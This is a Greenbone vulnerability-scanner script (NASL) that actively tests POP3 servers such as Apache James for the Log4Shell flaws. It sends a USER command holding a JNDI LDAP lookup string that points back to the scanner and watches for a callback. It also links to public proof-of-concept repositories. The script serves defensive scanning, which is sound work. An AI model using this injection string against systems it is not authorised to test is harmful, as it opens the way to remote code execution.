# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.117914");
  script_version("2022-01-20T15:07:10+0000");
  script_cve_id("CVE-2021-44228", "CVE-2021-45046");
  script_tag(name:"last_modification", value:"2022-01-21 11:28:09 +0000 (Fri, 21 Jan 2022)");
  script_tag(name:"creation_date", value:"2022-01-20 12:03:19 +0000 (Thu, 20 Jan 2022)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-12-14 01:15:00 +0000 (Tue, 14 Dec 2021)");
  script_name("Apache Log4j 2.0.x Multiple Vulnerabilities (POP3, Log4Shell) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("popserver_detect.nasl");
  script_require_ports("Services/pop3", 110);
  script_mandatory_keys("pop3/banner/available");

  script_xref(name:"URL", value:"https://logging.apache.org/log4j/2.x/security.html");
  script_xref(name:"URL", value:"https://issues.apache.org/jira/browse/LOG4J2-3198");
  script_xref(name:"URL", value:"https://issues.apache.org/jira/browse/LOG4J2-3201");
  script_xref(name:"URL", value:"https://github.com/apache/logging-log4j2/pull/607");
  script_xref(name:"URL", value:"https://github.com/apache/logging-log4j2/pull/608");
  script_xref(name:"URL", value:"https://github.com/advisories/GHSA-jfh8-c2jp-5v3q");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2021/12/10/1");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day/");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/");
  script_xref(name:"URL", value:"https://www.cyberkendra.com/2021/12/worst-log4j-rce-zeroday-dropped-on.html");
  script_xref(name:"URL", value:"https://github.com/YfryTchsGD/Log4jAttackSurface");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html");
  script_xref(name:"URL", value:"https://github.com/tangxiaofeng7/apache-log4j-poc");
  script_xref(name:"URL", value:"https://github.com/0x0021h/apache-log4j-rce");

  script_tag(name:"summary", value:"Apache Log4j is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted POP3 request and checks the response.

  Note: For a successful detection of this flaw the target host needs to be able to reach the
  scanner host on a TCP port randomly generated during the runtime of the VT (currently in the range
  of 10000-32000).");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  CVE-2021-44228: Apache Log4j2 JNDI features used in configuration, log messages, and parameters do
  not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can
  control log messages or log message parameters can execute arbitrary code loaded from LDAP servers
  when message lookup substitution is enabled.

  Notes:

  - This vulnerability is dubbed 'Log4Shell'

  - After the release of version 2.15.0 it was determined that an attack vector for remote code
  execution (RCE) still exists in specific configurations. The solution of this VT has been updated
  with info for full protection against all current known attack vectors.

  CVE-2021-45046: Denial of Service (DoS) and a possible remote code execution (RCE) in certain
  non-default configurations.");

  script_tag(name:"affected", value:"Apache Log4j versions 2.0.x. The following products are known
  to be affected against the request done by this VT:

  - Apache James

  Other products might be affected as well.");

  script_tag(name:"solution", value:"- Update Apache Log4j to version 2.12.2, 2.16.0 or later

  - Update Apache James to version 3.6.1 or later.

  Important: While some external resources are also mentioning that Java 8u121 is protecting against
  this flaw this had been proofed as unreliable due to existing bypass possibilities.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("port_service_func.inc");
include("misc_func.inc");
include("list_array_func.inc");
include("pcap_func.inc");
include("pop3_func.inc");

port = pop3_get_port( default:110 );

if( ! pop3_get_banner( port:port ) )
  exit( 0 );

if( ! soc = pop3_open_socket( port:port ) )
  exit( 0 );

ownip = this_host();
targetip = get_host_ip();
src_filter = pcap_src_ip_filter_from_hostnames();
# nb: We're currently using 10000-32000 to not get in conflict with the ephemeral port range used
# by most standard Linux/Unix operating systems. If we're choosing a port of that range we might
# have false positives due to race conditions (target is sending back a response to a request of
# another VT for which the scanner had chosen the same source port).
rnd_port = rand_int_range( min:10000, max:32000 );
filter = string( "tcp and dst port ", rnd_port, " and ", src_filter, " and dst host ", ownip );

payload_user  = "USER ${jndi:ldap://" + ownip + ":" + rnd_port + "/a}";
payload_user += '\r\n';

send( socket:soc, data:payload_user );
res = recv_line( socket:soc, length:2048 );

# nb: Don't use pop3_verify_banner() as this seems that it can't handle the response currently.
if( ! res || "+OK" >!< res ) {
  close( soc );
  exit( 0 );
}

# nb: We need to pass invalid credentials (at least for Apache James) so that the previous sent
# payload gets evaluated.
# TBD: Also only send the USER first for other implementations evaluating the USER string?
vtstrings = get_vt_strings();
payload_pass = "PASS " + vtstrings["lowercase_rand"];

res = send_capture( socket:soc, data:payload_pass + '\r\n', timeout:10, pcap_filter:filter );
pop3_close_socket( socket:soc );

if( res ) {

  # nb: We need to call the correct get_ip_*element() function below depending on the IP version
  # of the received IP packet.
  ip_vers_hex = hexstr( res[0] );
  if( ip_vers_hex[0] == 4 )
    ip = get_ip_element( ip:res, element:"ip_src" );
  else if( ip_vers_hex[0] == 6 )
    ip = get_ipv6_element( ipv6:res, element:"ip6_src" );

  if( ! ip )
    ip = "N/A";

  report  = 'By sending the following request:\n\n';
  report += payload_user + payload_pass + '\n\n';
  report += 'it was possible to trigger the vulnerability and make the remote host sending a request back to the scanner host (Details on the received packet follows).\n\n';
  report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
  report += "Originating IP:   " + ip + " (originating IP from target host side)";
  security_message( port:port, data:report );
  exit( 0 );
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host.
exit( 0 );
